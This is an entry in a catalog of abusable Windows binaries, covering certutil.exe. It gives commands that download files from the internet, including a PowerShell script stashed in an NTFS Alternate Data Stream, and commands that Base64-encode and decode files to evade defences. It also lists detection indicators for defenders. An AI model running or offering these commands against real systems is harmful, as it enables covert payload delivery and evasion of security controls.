---
name: Certutil.exe
description: Windows binary used for handeling certificates
functions:
  download:
    - description: Download and save 7zip to disk in the current folder.
      code: certutil.exe -urlcache -split -f http://7-zip.org/a/7z1604-x64.exe 7zip.exe
      mitreid: T1105
      mitrelink: https://attack.mitre.org/wiki/Technique/T1105
      operatingsystem: Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10
      privileges: User
      usecase: Download file from Internet
  encode:
    - description: Command to encode a file using Base64
      code: certutil -encode inputFileName encodedOutputFileName
      mitreid: T1027
      mitrelink: https://attack.mitre.org/wiki/Technique/T1027
      operatingsystem: Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10
      privileges: User
      usecase: Encode files to evade defensive measures
  decode:
    - description: Command to decode a Base64 encoded file.
      code: certutil -decode encodedInputFileName decodedOutputFileName
      mitreid: T1140
      mitrelink: https://attack.mitre.org/wiki/Technique/T1140
      operatingsystem: Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10
      privileges: User
      usecase: Decode files to evade defensive measures
  ads:
    - description: Download and save a PS1 file to an Alternate Data Stream (ADS).
      code: certutil.exe -urlcache -split -f https://raw.githubusercontent.com/Moriarty2016/git/master/test.ps1 c:\temp:ttt
      mitreid: T1105
      mitrelink: https://attack.mitre.org/wiki/Technique/T1105
      operatingsystem: Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10
      privileges: User
      usecase: Download file from Internet and save it in an NTFS Alternate Data Stream
resources:
    - resource: https://twitter.com/Moriarty_Meng/status/984380793383370752
    - resource: https://twitter.com/mattifestation/status/620107926288515072
fullpath:
    - path: C:\Windows\System32\certutil.exe
    - path: C:\Windows\SysWOW64\certutil.exe
detection:
  - IOC: Certutil.exe creating new files on disk
  - IOC: Useragent Microsoft-CryptoAPI/10.0
  - IOC: Useragent CertUtil URL Agent
acknowledgement:
  - Person: Matt Graeber
    Handle: '@mattifestation'
  - Person: Moriarty
    Handle: '@moriarty2016'
---
